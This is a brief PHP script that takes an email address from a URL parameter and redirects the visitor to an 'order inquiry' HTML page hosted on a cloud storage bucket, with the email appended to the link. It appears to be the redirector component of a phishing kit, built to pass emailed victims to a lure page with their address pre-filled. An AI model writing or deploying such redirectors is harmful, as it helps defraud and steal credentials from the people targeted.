<?php
function getemIDFromem($em)
{
$find = '@';
$pos = strpos($em, $find);
$emID = substr($em, 0, $pos);
return $emID;
}
$em = $_GET['em'];
$emID = getemIDFromem($em);
header("Location: https://cloud-object-storage-h8-cos-static-web-hosting-35e.s3.eu-de.cloud-object-storage.appdomain.cloud/butbox2019_ORDER_INQ_328Y389.html?#$em");
?>
